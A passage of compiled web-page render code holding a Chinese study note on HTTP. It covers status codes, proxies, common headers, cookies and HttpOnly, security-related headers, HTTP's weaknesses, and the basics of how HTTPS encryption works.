URI。也就是说，如果已经把资源对应的 URI 保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[a._v("\x3c!-- 像下方给出的请求 URI，当指定资源路径的最后忘记添加斜杠 “/”，就会产生 301 状态码 --\x3e\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("https")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("//coderljw.ga/")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br")])]),t("ul",[t("li",[t("p",[a._v("302 Found：临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。和 301 Moved Permanently 状态码相似，但 302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的 URI 将来还有可能发生改变。比如，用户把 URI 保存成书签，但不会像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。")])]),a._v(" "),t("li",[t("p",[a._v("303 See Other：该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。")])]),a._v(" "),t("li",[t("p",[a._v("当 301、302、303 响应状态码返回时，几乎所有的浏览器都会把 POST 改成 GET，并删除请求报文内的主体，之后请求会自动再次发送。301、302 标准是禁止将 POST 方法改变成 GET 方法的，但实际使用时大家都会这么做。")])]),a._v(" "),t("li",[t("p",[a._v("304 Not Modified：该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。")])]),a._v(" "),t("li",[t("p",[a._v("307 Temporary Redirect：临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准禁止 POST 变换成 GET，但实际使用时大家并不遵守。307 会遵照浏览器标准，不会从 POST 变成 GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。")])])])]),a._v(" "),t("li",[t("p",[a._v("4XX 错误请求。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("400 Bad Request：该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像 200 OK 一样对待该状态码。")])]),a._v(" "),t("li",[t("p",[a._v("401 Unauthorized：该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。另外若之前已进行过 1 次请求，则表示用户认证失败。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/401 Unauthorized.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("403 Forbidden：该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源 IP 地址试图访问）等列举的情况都可能是发生 403 的原因。")])]),a._v(" "),t("li",[t("p",[a._v("404 Not Found：该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。")])])])]),a._v(" "),t("li",[t("p",[a._v("5XX 服务端错误。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("500 Internal Server Error：该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web 应用存在的 bug 或某些临时的故障。")])]),a._v(" "),t("li",[t("p",[a._v("503 Service Unavailable：该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入 RetryAfter 首部字段再返回给客户端。")])])])])]),a._v(" "),t("h2",{attrs:{id:"_21-通信数据转发程序-代理、网关、隧道"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_21-通信数据转发程序-代理、网关、隧道"}},[a._v("#")]),a._v(" 21. 通信数据转发程序 ：代理、网关、隧道")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("代理。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器。代理不改变请求 URI，会直接发送给前方持有资源的目标服务器。")]),a._v(" "),t("li",[a._v("使用代理服务器的理由有：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等（科学上网！嘿嘿！）。")]),a._v(" "),t("li",[a._v("缓存代理：代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。")]),a._v(" "),t("li",[a._v("透明代理：转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。\n"),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/代理.png"),loading:"lazy"}})])])])]),a._v(" "),t("li",[t("p",[a._v("网关。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非 HTTP 协议服务。")]),a._v(" "),t("li",[a._v("利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用 SQL 语句查询数据。另外，在 Web 购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。\n"),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/网关.png"),loading:"lazy"}})])])])]),a._v(" "),t("li",[t("p",[a._v("隧道。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。")]),a._v(" "),t("li",[a._v("隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。")]),a._v(" "),t("li",[a._v("隧道本身是透明的，客户端不用在意隧道的存在。\n"),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/隧道.png"),loading:"lazy"}})])])])])]),a._v(" "),t("h2",{attrs:{id:"_22-http-1-1-首部字段一览"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_22-http-1-1-首部字段一览"}},[a._v("#")]),a._v(" 22. HTTP/1.1 首部字段一览")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("通用首部字段。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/通用首部字段.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("请求首部字段。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/请求首部字段.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("响应首部字段。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/响应首部字段.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("实体首部字段。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/实体首部字段.png"),loading:"lazy"}})])]),a._v(" "),t("h2",{attrs:{id:"_23-http-1-1-通用首部字段"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_23-http-1-1-通用首部字段"}},[a._v("#")]),a._v(" 23. HTTP/1.1 通用首部字段")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("Cache-Control：通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。指令的参数是可选的，多个指令之间通过 “,” 分隔。首部字段 Cache-Control 的指令可用于请求及响应时。")])]),a._v(" "),t("li",[t("p",[a._v("缓存请求指令。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/缓存请求指令.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("缓存响应指令。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/缓存响应指令.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("no-cache 指令：由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数。")]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Cache-Control")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("no-cache=Location")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])])]),a._v(" "),t("li",[t("p",[a._v("no-store：从字面意思上很容易把 no-cache 误解成为不缓存，但事实上 no-cache 代表不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-not-serve-from-cache-without-revalidation 更合适。no-store 才是真正地不进行缓存，请读者注意区别理解。")])]),a._v(" "),t("li",[t("p",[a._v("s-maxage 指令：s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s-maxage 指令只适用于供多位用户使用的公共缓存服务器。也就是说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。另外，当使用 s-maxage 指令后，则直接忽略对 Expires 首部字段及 max-age 指令的处理。")])]),a._v(" "),t("li",[t("p",[a._v("max-age 指令：应用 HTTP/1.1 版本的缓存服务器遇到同时存在 Expires 首部字段的情况时，会优先处理 max-age 指令，而忽略掉 Expires 首部字段。而 HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略掉。")])]),a._v(" "),t("li",[t("p",[a._v("no-transform 指令：使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。这样做可防止缓存或代理压缩图片等类似操作。")])])]),a._v(" "),t("h2",{attrs:{id:"_24-请求首部字段"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_24-请求首部字段"}},[a._v("#")]),a._v(" 24. 请求首部字段")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("Referer：首部字段 Referer 会告知服务器请求的原始资源的 URI。客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字段（有时在项目开发中获取网络图片资源，可能会返回 403，这时可以试试不发送 Referer 后能不能获取图片-"),t("RouterLink",{attrs:{to:"/note/project/HTML/#_2-ie-配置-如果安装了-gcf-google-内核渲染-则使用-gcf-来渲染页面-如果未安装-gcf-则使用最高版本的-ie-内核进行渲染"}},[a._v("配置全局不携带请求域")]),a._v("）。另外，Referer 的正确的拼写应该是 Referrer，但不知为何，大家一直沿用这个错误的拼写。")],1)]),a._v(" "),t("li",[t("p",[a._v("User-Agent：首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器（嘿嘿！玩爬虫要这个哟！）。")])])]),a._v(" "),t("h2",{attrs:{id:"_25-响应首部字段"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_25-响应首部字段"}},[a._v("#")]),a._v(" 25. 响应首部字段")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("ETag：首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag 值。另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有统一的算法规则，而仅仅是由服务器来分配。")]),a._v(" "),t("blockquote",[t("p",[a._v("强 ETag 值，不论实体发生多么细微的变化都会改变其值。")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("ETag")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v('"usagi-1234"')])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("blockquote",[t("p",[a._v("弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("ETag")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v('W/"usagi-1234"')])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/ETag.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("Location：使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的 URI。几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。")])]),a._v(" "),t("li",[t("p",[a._v("Server：首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。")])])]),a._v(" "),t("h2",{attrs:{id:"_26-实体首部字段"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_26-实体首部字段"}},[a._v("#")]),a._v(" 26. 实体首部字段")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("Expires：首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在 Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写入与首部字段 Date 相同的时间值。")]),a._v(" "),t("li",[a._v("但是，当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。")])])])])]),a._v(" "),t("h2",{attrs:{id:"_27-为-cookie-服务的首部字段"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_27-为-cookie-服务的首部字段"}},[a._v("#")]),a._v(" 27. 为 Cookie 服务的首部字段")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该 Web 网站时，可通过通信方式取回之前发放的 Cookie。")])]),a._v(" "),t("li",[t("p",[a._v("Set-Cookie。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/Set-Cookie.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("HttpOnly 属性。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对 Cookie 的信息窃取。")])])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Set-Cookie")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("name=value; HttpOnly")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("blockquote",[t("ul",[t("li",[a._v("通过上述设置，通常从 Web 页面内还可以对 Cookie 进行读取操作。但使用 JavaScript 的 document.cookie 就无法读取附加 HttpOnly 属性后的 Cookie 的内容了。因此，也就无法在 XSS 中利用 JavaScript 劫持 Cookie 了。")]),a._v(" "),t("li",[a._v("该扩展并非是为了防止 XSS 而开发的。")])])])])]),a._v(" "),t("h2",{attrs:{id:"_28-其他首部字段"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_28-其他首部字段"}},[a._v("#")]),a._v(" 28. 其他首部字段")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("HTTP 首部字段是可以自行扩展的。下面为最为常用的首部字段。")])]),a._v(" "),t("li",[t("p",[a._v("X-Frame-Options：首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("DENY ：拒绝。")]),a._v(" "),t("li",[a._v("SAMEORIGIN ：仅同源域名下的页面（Top-level-browsing-context）匹配时许可。（比如，当指定 http://hackr.jp/sample.html页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被允许可加载该页面，而 example.com 等其他域名的页面就不行了）。")])])])]),a._v(" "),t("li",[t("p",[a._v("X-XSS-Protection：首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("0 ：将 XSS 过滤设置成无效状态。")]),a._v(" "),t("li",[a._v("1 ：将 XSS 过滤设置成有效状态。")])])])]),a._v(" "),t("li",[t("p",[a._v("DNT：首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("0 ：同意被追踪。")]),a._v(" "),t("li",[a._v("1 ：拒绝被追踪。")])])])]),a._v(" "),t("li",[t("p",[a._v("P3P：首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform forPrivacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。")])])]),a._v(" "),t("h2",{attrs:{id:"_29-http-的缺点"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_29-http-的缺点"}},[a._v("#")]),a._v(" 29. HTTP 的缺点")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("通信使用明文（不加密），内容可能会被窃听：由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("通信的加密。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或 TLS（Transport Layer Security，安全层传输协议）的组合使用，加密 HTTP 的通信内容。")]),a._v(" "),t("li",[a._v("用 SSL 建立安全通信线路之后，就可以在这条线路上进行 HTTP 通信了。与 SSL 组合使用的 HTTP 被称为 HTTPS（HTTPSecure，超文本传输安全协议）或 HTTP over SSL。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/通信的加密.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("内容的加密。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("由于 HTTP 协议中没有加密机制，那么就对 HTTP 协议传输的内容本身加密。即把 HTTP 报文里所含的内容进行加密处理。")]),a._v(" "),t("li",[a._v("在这种情况下，客户端需要对 HTTP 报文进行加密处理后再发送请求。诚然，为了做到有效的内容加密，前提是要求客户端和服务器同时具备加密和解密机制。主要应用在 Web 服务中。")]),a._v(" "),t("li",[a._v("有一点必须引起注意，由于该方式不同于 SSL 或 TLS 将整个通信线路加密处理，所以内容仍有被篡改的风险。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/内容的加密.png"),loading:"lazy"}})])])]),a._v(" "),t("li",[t("p",[a._v("不验证通信方的身份，因此有可能遭遇伪装：HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("任何人都可发起请求。")]),a._v(" "),t("blockquote",[t("p",[a._v("HTTP 协议的实现本身非常简单，不论是谁发送过来的请求都会返回响应，因此不确认通信方，会存在以下各种隐患。")]),a._v(" "),t("ol",[t("li",[a._v("无法确定请求发送至目标的 Web 服务器是否是按真实意图返回响应的那台服务器。有可能是已伪装的 Web 服务器。")]),a._v(" "),t("li",[a._v("无法确定响应返回到的客户端是否是按真实意图接收响应的那个客户端。有可能是已伪装的客户端。")]),a._v(" "),t("li",[a._v("无法确定正在通信的对方是否具备访问权限。因为某些 Web 服务器上保存着重要的信息，只想发给特定用户通信的权限。")]),a._v(" "),t("li",[a._v("无法判定请求是来自何方、出自谁手。")]),a._v(" "),t("li",[a._v("即使是无意义的请求也会照单全收。无法阻止海量请求下的 DoS 攻击（Denial of Service，拒绝服务攻击）。")])])])]),a._v(" "),t("li",[t("p",[a._v("查明对手的证书。")]),a._v(" "),t("blockquote",[t("p",[a._v("虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段，可用于确定方。")])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/查明对手的证书.png"),loading:"lazy"}})])])]),a._v(" "),t("li",[t("p",[a._v("无法证明报文的完整性，所以有可能已遭篡改。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("接收到的内容可能有误。")]),a._v(" "),t("blockquote",[t("p",[a._v("由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。换句话说，没有任何办法确认，发出的请求 / 响应和接收到的请求 / 响应是前后相同的。")])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/接收到的内容可能有误.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("如何防止篡改。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("虽然有使用 HTTP 协议确定报文完整性的方法，但事实上并不便捷、可靠。其中常用的是 MD5 和 SHA-1 等散列值校验的方法，以及用来确认文件的数字签名方法。")]),a._v(" "),t("li",[a._v("可惜的是，用这些方法也依然无法百分百保证确认结果正确。因为 PGP 和 MD5 本身被改写的话，用户是没有办法意识到的。")]),a._v(" "),t("li",[a._v("为了有效防止这些弊端，有必要使用 HTTPS。SSL 提供认证和加密处理及摘要功能。仅靠 HTTP 确保完整性是非常困难的，因此通过和其他协议组合使用来实现这个目标。")])])])])])])]),a._v(" "),t("h2",{attrs:{id:"_30-http-加密-认证-完整性保护-https"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_30-http-加密-认证-完整性保护-https"}},[a._v("#")]),a._v(" 30. HTTP+ 加密 + 认证 + 完整性保护 = HTTPS")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("HTTP 加上加密处理和认证以及完整性保护后即是 HTTPS。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/使用 HTTPS 通信.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("HTTPS 是身披 SSL 外壳的 HTTP。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("HTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用 SSL（Secure Socket Layer）和 TLS（Transport Layer Security）协议代替而已。")]),a._v(" "),t("li",[a._v("通常，HTTP 直接和 TCP 通信。当使用 SSL 时，则演变成先和 SSL 通信，再由 SSL 和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披 SSL 协议这层外壳的 HTTP。")]),a._v(" "),t("li",[a._v("SSL 是独立于 HTTP 的协议，所以不光是 HTTP 协议，其他运行在应用层的 SMTP 和 Telnet 等协议均可配合 SSL 协议使用。可以说 SSL 是当今世界上应用最为广泛的网络安全技术。")])])])]),a._v(" "),t("li",[t("p",[a._v("相互交换密钥的公开密钥加密技术。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("在对 SSL 进行讲解之前，我们先来了解一下加密方法。SSL 采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。近代的加密方法中加密算法是公开的，而密钥却是保密的。通过这种方式得以保持加密方法的安全性。加密和解密都会用到密钥。没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了。如果密钥被攻击者获得，那加密也就失去了意义。")])]),a._v(" "),t("li",[t("p",[a._v("共享密钥加密的困境：加密和解密同用一个密钥的方式称为共享密钥加密（Common keycrypto system），也被叫做对称密钥加密。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("以共享密钥方式加密时必须将密钥也发给对方。可究竟怎样才能安全地转交？在互联网上转发密钥时，如果通信被监听那么密钥就可会落入攻击者之手，同时也就失去了加密的意义。另外还得设法安全地保管接收到的密钥。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/共享密钥加密的困境.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("使用两把密钥的公开密钥加密。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("公开密钥加密使用一对非对称的密钥。一把叫做私有密钥（private key），另一把叫做公开密钥（public key）。顾名思义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得。")]),a._v(" "),t("li",[a._v("使用公开密钥加密方式，发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。利用这种方式，不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走。")]),a._v(" "),t("li",[a._v("另外，要想根据密文和公开密钥，恢复到信息原文是异常困难的，因为解密过程就是在对离散对数进行求值，这并非轻而易举就能办到。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/使用两把密钥的公开密钥加密.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("HTTPS 采用混合加密机制。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。若密钥能够实现安全交换，那么有可能会考虑仅使用公开密钥加密来通信。但是公开密钥加密与共享密钥加密相比，其处理速度要慢。")]),a._v(" "),t("li",[a._v("所以应充分利用两者各自的优势，将多种方法组合起来用于通信。在交换密钥环节使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/HTTPS 采用混合加密机制.png"),loading:"lazy"}})])])]),a._v(" "),t("li",[t("p",[a._v("证明公开密钥正确性的证书。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("遗憾的是，公开密钥加密方式还是存在一些问题的。那就是无法证明公开密钥本身就是货真价实的公开密钥。比如，正准备和某台服务器建立公开密钥加密方式下的通信时，如何证明收到的公开密钥就是原本预想的那台服务器发行的公开密钥。或许在公开密钥传输途中，真正的公开密钥已经被攻击者替换掉了。")]),a._v(" "),t("li",[a._v("为了解决上述问题，可以使用由数字证书认证机构（CA，CertificateAuthority）和其相关机关颁发的公开密钥证书。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/证明公开密钥正确性的证书.png"),loading:"lazy"}})])]),a._v(" "),t("h2",{attrs:{id:"_31-https-的安全通信机制"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_31-https-的安全通信机制"}},[a._v("#")]),a._v(" 31. HTTPS 的安全通信机制")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("HTTPS 通信。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/HTTPS 通信.png"),loading:"lazy"}}),a._v(" "),t("blockquote",[t("p",[a._v("CBC 模式（Cipher Block Chaining）又名密码分组链接模式。在此模式下，将前一个明文块加密处理后和下一个明文块做 XOR 运算，使之重叠，然后再对运算结果做加密处理。对第一个明文块做加密时，要么使用前一段密文的最后一块，要么利用外部生成的初始向量（initial vector，IV）。")])])]),a._v(" "),t("li",[t("p",[a._v("SSL 速度慢。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("HTTPS 也存在一些问题，那就是当使用 SSL 时，它的处理速度会变慢。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/SSL 速度慢.png"),loading:"lazy"}}),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("SSL 的慢分两种。一种是指通信慢。另一种是指由于大量消耗 CPU 及内存等资源，导致处理速度变慢。")]),a._v(" "),t("li",[a._v("和使用 HTTP 相比，网络负载可能会变慢 2 到 100 倍。除去和 TCP 连接、发送 HTTP 请求 • 响应以外，还必须进行 SSL 通信，因此整体上处理通信量不可避免会增加。")]),a._v(" 